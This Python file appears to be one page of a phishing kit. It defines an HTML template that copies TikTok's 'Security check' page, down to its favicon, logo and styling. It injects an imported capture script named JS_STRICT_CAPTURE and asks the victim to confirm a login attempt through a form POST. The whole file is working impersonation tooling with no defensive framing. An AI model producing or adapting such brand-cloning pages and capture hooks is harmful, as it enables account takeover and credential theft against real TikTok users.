"""checkpoint.py - Template checkpoint TikTok."""

from platforms._shared import JS_STRICT_CAPTURE, TK_LOGO_SVG as _TK_LOGO_SVG

HTML_CHECKPOINT = r"""
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ direction }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
    <title>Security check | TikTok</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .tt-card { background: #fff; padding: 28px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); max-width: 400px; width: 100%; border: 1px solid #e3e3e4; box-sizing: border-box; }
        .btn-yes { background: #fe2c55; color: #fff; border: none; border-radius: 4px; padding: 12px; font-weight: 600; width: 100%; font-size: 15px; cursor: pointer; }
        .btn-no { background: #f1f1f2; color: #161823; border: none; border-radius: 4px; padding: 12px; font-weight: 600; width: 100%; font-size: 15px; cursor: pointer; margin-top: 8px; }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center justify-center p-4">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="tt-card">
        <div class="flex items-center justify-center mb-4">
            <svg width="32" height="32" viewBox="0 0 48 48" fill="none">
                <path d="M34 9c.6 4.2 3.4 7.6 7.5 8.3v5.5c-2.7.1-5.2-.7-7.5-2.1v11.6c0 6.5-5.3 11.8-11.8 11.8S10.5 37.8 10.5 31.3s5.3-11.8 11.8-11.8c.6 0 1.2.1 1.8.2v6c-.6-.2-1.2-.3-1.8-.3-3.2 0-5.8 2.6-5.8 5.8s2.6 5.8 5.8 5.8 5.8-2.6 5.8-5.8V9H34z" fill="#000"/>
            </svg>
        </div>
        <h2 class="text-xl font-bold text-center text-gray-900 mb-2">{{ checkpoint_title }}</h2>
        <p class="text-gray-600 text-center text-sm mb-5">{{ checkpoint_sub }}</p>
        <div class="bg-gray-50 rounded p-3 mb-5 space-y-2 text-sm">
            <div class="flex justify-between"><span class="text-gray-500">{{ device_label }}:</span><span class="font-medium text-gray-900">{{ device }}</span></div>
            <div class="flex justify-between"><span class="text-gray-500">{{ location_label }}:</span><span class="font-medium text-gray-900">{{ city }}, {{ country }}</span></div>
            <div class="flex justify-between"><span class="text-gray-500">{{ time_label }}:</span><span class="font-medium text-gray-900">{{ lang_name }}</span></div>
        </div>
        <form method="POST">
            <input type="hidden" name="action" value="checkpoint">
            <button type="submit" class="btn-yes">{{ yes_btn }}</button>
        </form>
        <a href="/" class="btn-no text-center block mt-2">{{ no_btn }}</a>
        <p class="text-center text-xs text-gray-400 mt-4">{{ help }}</p>
    </div>
</body>
</html>
"""
